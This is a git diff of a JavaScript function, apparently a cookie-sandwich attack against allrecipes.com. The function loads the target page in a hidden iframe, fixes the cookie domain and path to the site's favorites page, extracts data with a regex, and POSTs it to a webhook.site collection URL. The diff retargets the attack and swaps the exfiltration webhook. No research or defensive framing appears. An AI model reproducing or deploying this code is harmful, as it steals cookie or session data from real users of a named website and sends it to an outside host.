@@ -3,8 +3,8 @@ async function sandwich(target, cookie) {
     const iframe = document.createElement('iframe');
 
     const url = new URL(target);
-    const domain = url.hostname;
-    const path = url.pathname;
+    const domain = ".allrecipes.com";
+    const path = "/favorites";
 
     iframe.src = target;
     // Hide the iframe
@@ -26,7 +26,7 @@ async function sandwich(target, cookie) {
             var result = responseData.match(regexf);
             const resultado = result.join(" ")
             // Step 4: Alert respone
-            const x2 = await fetch("https://webhook.site/0536458d-220b-4da3-9c4d-0d5f79160bc5/", {
+            const x2 = await fetch("https://webhook.site/49c9cc9e-5da5-400e-8342-54b339a0a24a/", {
               method: "POST",
               mode: 'no-cors',
               headers: {
@@ -39,4 +39,4 @@ async function sandwich(target, cookie) {
     }
 }
 
-setTimeout(sandwich, 100, 'https://www.allrecipes.com/article/how-to-submit-recipes/', 'hid');
+setTimeout(sandwich, 100, 'https://www.allrecipes.com/favorites', 'hid');
